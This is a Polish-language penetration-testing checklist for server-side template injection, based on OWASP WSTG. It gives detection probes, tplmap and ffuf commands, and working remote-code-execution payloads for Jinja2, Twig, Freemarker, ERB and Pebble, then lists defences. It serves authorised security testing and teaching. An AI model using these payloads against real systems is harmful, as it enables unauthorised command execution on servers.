# WSTG-INPV-18 — Testing for Server-side Template Injection (SSTI)

## Cele

- Detect template injection vulnerability points
- Identify the templating engine
- Build the exploit

## KOMENDY

### tplmap - automatyczny skaner SSTI

```bash
python3 tplmap.py -u "https://TARGET/page?name=test"

```

### Detekcja SSTI - polyglot

```bash
curl -s "https://TARGET/page?name={{7*7}}" | grep "49"
curl -s "https://TARGET/page?name=${7*7}" | grep "49"
curl -s "https://TARGET/page?name=<%= 7*7 %>" | grep "49"
curl -s "https://TARGET/page?name={{7*'7'}}" | grep "7777777\|49"
curl -s "https://TARGET/page?name=#{7*7}" | grep "49"
curl -s "https://TARGET/page?name=*{7*7}" | grep "49"

```

### Identyfikacja silnika

```bash
# Jinja2 (Python): {{7*7}} = 49, {{7*'7'}} = 7777777
# Twig (PHP): {{7*7}} = 49, {{7*'7'}} = 49
# Freemarker (Java): ${7*7} = 49
# Pebble (Java): {{7*7}} = 49
# ERB (Ruby): <%= 7*7 %> = 49

```

### Jinja2 RCE

```bash
curl -s "https://TARGET/page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

```

### Twig RCE

```bash
curl -s "https://TARGET/page?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

```

### Freemarker RCE

```bash
curl -s "https://TARGET/page?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

```

## KOMENDY Z WORDLISTAMI

### SecLists template engine expressions

```bash
ffuf -u "https://TARGET/page?name=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-expression.txt -mc all -o output_ffuf_ssti.json

```

### SecLists template special vars

```bash
ffuf -u "https://TARGET/page?name=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/template-engines-special-vars.txt -mc all -o output_ffuf_ssti_vars.json

```

### PayloadsAllTheThings SSTI

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Server Side Template Injection/README.md
# Zawiera payloady dla: Jinja2, Twig, Freemarker, Pebble, Jade, ERB, Smarty, Mako, Velocity

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Wstaw {{7*7}} i inne wyrażenia do kazdego parametru
2. Zidentyfikuj silnik szablonów na podstawie odpowiedzi
3. Eskaluj od detekcji do RCE uzywajac payloadow specyficznych dla silnika
4. Sprawdz PayloadsAllTheThings README dla danego silnika
5. Testuj sandbox bypass jesli silnik jest ograniczony


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### SSTI — Server-Side Template Injection

- Dane uzytkownika sa **wstawiane do szablonu** zamiast przekazywane jako zmienne
- Roznica: `render("Hello " + user_input)` (podatne) vs `render("Hello {{name}}", name=user_input)` (bezpieczne)
- Skutek: od **information disclosure** do **Remote Code Execution (RCE)**

### Identyfikacja silnika szablonow

| Test | Jinja2 | Twig | Freemarker | ERB | Pebble |
|------|--------|------|------------|-----|--------|
| `{{7*7}}` | 49 | 49 | — | — | 49 |
| `${7*7}` | — | — | 49 | — | — |
| `<%= 7*7 %>` | — | — | — | 49 | — |
| `{{7*'7'}}` | 7777777 | 49 | — | — | — |
| `#{7*7}` | — | — | — | — | — |

- Jinja2: `{{7*'7'}}` = `7777777` (string * int = powtorzenie)
- Twig: `{{7*'7'}}` = `49` (rzutowanie na int)
- Polyglot detekcji: `${{<%[%'"}}%\.`

### Eskalacja do RCE — przykłady

- **Jinja2**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig**: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **ERB**: `<%= system('id') %>`
- **Pebble**: `{% set cmd = 'id' %}{% set runtime = beans.get('java.lang.Runtime') %}...`

### Obrona

- **NIGDY** nie wstawiaj danych uzytkownika bezposrednio do szablonow
- Uzyj parametryzowanych szablonow: `render(template, variables={})` — dane jako zmienne
- Wlacz **sandbox** silnika szablonow (Jinja2: `SandboxedEnvironment`)
- Usun dostep do niebezpiecznych obiektow z kontekstu szablonu
- Waliduj dane wejsciowe — odrzucaj znaki specjalne szablonow: `{{`, `${`, `<%`, `#{`
- Loguj i monitoruj proby uzycia skladni szablonow w danych wejsciowych

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| tplmap | Wykrywanie i eksploatacja Server-Side Template Injection | [GitHub](https://github.com/epinna/tplmap) |
| Backslash Powered Scanner | Wykrywanie nieznanych klas injection w tym SSTI | [GitHub](https://github.com/PortSwigger/backslash-powered-scanner) |
